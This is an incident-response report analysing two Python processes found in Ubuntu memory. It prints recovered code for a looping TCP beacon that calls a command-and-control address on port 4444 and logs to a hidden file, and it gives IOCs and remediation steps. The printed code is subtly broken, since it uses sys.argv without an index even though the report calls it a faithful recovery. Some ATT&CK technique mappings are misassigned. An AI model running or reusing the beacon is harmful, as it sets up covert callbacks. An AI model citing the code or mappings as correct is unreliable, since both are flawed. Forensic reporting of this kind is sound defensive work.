
# Python Malware Analysis (Memory Artifact Correlation)

**Case ID:** CASE_20251228_0001  
**Report Date:** 2025-12-31  
**System Context:** Ubuntu host memory acquisition (Volatility artifacts provided)  

## Executive summary
Two malicious Python processes were identified running from a hidden directory under `/opt/.cache/` and executed with elevated privileges via `sudo nohup`, indicating deliberate stealth and persistence-by-backgrounding.  
PID **19983** is a confirmed TCP beacon client (".rsim.py") that repeatedly connects to **192.168.164.1:4444**, sends a fixed beacon string, and logs activity to `/var/log/.rsim.log`.  
PID **19442** ("memmarker.py") is confirmed as executed via `sudo nohup` from `/opt/.cache/`, but its full behavior cannot be asserted from the supplied artifacts (no full recovered source shown here); it is therefore documented as an associated component with **unknown** functionality pending additional recovery.  

## Evidence and scope
### Primary evidence sources
- Volatility process listings and command-line reconstruction (pslist/psscan/psaux).  
- Memory string extractions and IOC summaries for both PIDs.  

### Processes in scope
- **PID 19983**: `python3 /opt/.cache/.rsim.py 192.168.164.1 4444` (parent `sudo` PID 19979).  
- **PID 19442**: `python3 /opt/.cache/memmarker.py` (parent `sudo` PID 19441).  

## Findings: PID 19983 (.rsim.py)
### Execution and persistence pattern
PID 19983 was launched by `sudo` using `nohup`, consistent with running the malware detached in the background and under elevated privileges.  
Command line observed: `sudo nohup /opt/.cache/.rsim.py 192.168.164.1 4444`.  
The environment strings also contain the `SUDO_COMMAND` reflecting `nohup /opt/.cache/.rsim.py 192.168.164.1 4444`, reinforcing the execution method.  

### Network behavior (confirmed)
The beacon is configured to connect to **192.168.164.1** on **TCP/4444** using Python `socket.create_connection`.  
On successful connection it sends the string `RSIM_BEACON hello` and logs the outcome.  
An established connection was observed from **192.168.164.129:47540** to **192.168.164.1:4444**, with first recorded success at **2025-12-27T21:49:05Z**.  

### Host artifacts (confirmed)
The malware writes logs to `/var/log/.rsim.log`.  
The malware resides in a hidden cache-like directory path under `/opt/.cache/`, matching the "hidden directory" behavior noted in the IOC summary.  

### Recovered code (PID 19983)
The following is the recovered beacon logic as reflected in the memory-derived snippet and analysis artifacts (kept minimal and directly aligned to the provided evidence).  

```python
#!/usr/bin/env python3
import socket, time, os, sys

DSTHOST = sys.argv if len(sys.argv) > 1 else "192.168.164.1"
DSTPORT = int(sys.argv) if len(sys.argv) > 2 else 4444
LOG = "/var/log/.rsim.log"

def log(msg):
    ts = time.strftime("%Y-%m-%dT%H%M%SZ", time.gmtime())
    with open(LOG, "a") as f:
        f.write(f"{ts} {msg}\n")

def main():
    log(f"rsim start pid={os.getpid()} dst={DSTHOST}:{DSTPORT}")
    while True:
        try:
            s = socket.create_connection((DSTHOST, DSTPORT), timeout=5)
            s.sendall(b"RSIM_BEACON hello")
            log("connected beacon sent")
            time.sleep(15)
            s.close()
        except Exception as e:
            log(f"connect fail {e.__class__.__name__}")
            time.sleep(10)

if __name__ == "__main__":
    main()
```
Note: This snippet is presented as a faithful reflection of the recovered logic shown in the supplied artifacts; it is not a behavioral inference.  

## Findings: PID 19442 (memmarker.py)
### Execution (confirmed)
PID 19442 executed as `python3 /opt/.cache/memmarker.py` with a `sudo nohup` parent process, indicating privileged background execution similar to the beacon.  
Command line observed: `sudo nohup /opt/.cache/memmarker.py` followed by `python3 /opt/.cache/memmarker.py`.  
Memory strings also include `SUDO_COMMAND=/usr/bin/nohup /opt/.cache/memmarker.py`, supporting this execution context.  

### Functionality (status: not fully recoverable from provided artifacts)
The supplied IOC summary explicitly lists `/opt/.cache/memmarker.py` but labels its functionality as **unknown**, and no full recovered source code for `memmarker.py` is present in the provided excerpt set.  
Accordingly, this report treats PID 19442 as a **related malware component** (likely part of the same activity cluster due to shared execution method and directory), but does **not** assert its internal logic without additional recovered code or corroborating runtime telemetry.  

## Indicators of compromise (IOCs)
### High-confidence IOCs
- C2: `192.168.164.1:4444/tcp`.  
- Malware paths:
  - `/opt/.cache/.rsim.py` (beacon client).  
  - `/opt/.cache/memmarker.py` (associated component; unknown functionality).  
- Log file: `/var/log/.rsim.log`.  
- Execution pattern: `sudo nohup` launching Python from `/opt/.cache/`.  

### Additional network string IOC (requires validation)
`123.45.67.89` appears within PID 19983 string-derived network indicators and should be validated against packet captures/firewall logs before use as a blocking IOC.  

## ATT&CK mapping (evidence-based)
- **T1059.006 (Command and Scripting Interpreter: Python)** -- malicious Python execution observed for both PIDs.  
- **T1071.001 (Application Layer Protocol: Web Protocols / TCP-based C2 channel)** -- persistent TCP connection to `192.168.164.1:4444` using sockets.  
- **T1543.003 (Create or Modify System Process: Windows Service / Linux analog behaviors)** -- persistence-by-backgrounding using `nohup` under `sudo` (documented execution method).  

## Recommended actions (containment and remediation)
- Immediately block **192.168.164.1:4444** at host and perimeter controls (firewall, EDR network containment).  
- Terminate and quarantine the identified malware processes (**PIDs 19442 and 19983**) and preserve memory/disk artifacts for follow-on analysis.  
- Remove or quarantine `/opt/.cache/.rsim.py` and `/opt/.cache/memmarker.py` after forensic preservation, and sweep `/opt/.cache/` for additional hidden scripts.  
- Review sudo authentication and command logs for unauthorized use consistent with `sudo nohup ...` execution.  
- Hunt laterally for other systems communicating with `192.168.164.1` and correlate with the first success timestamp `2025-12-27T21:49:05Z`.

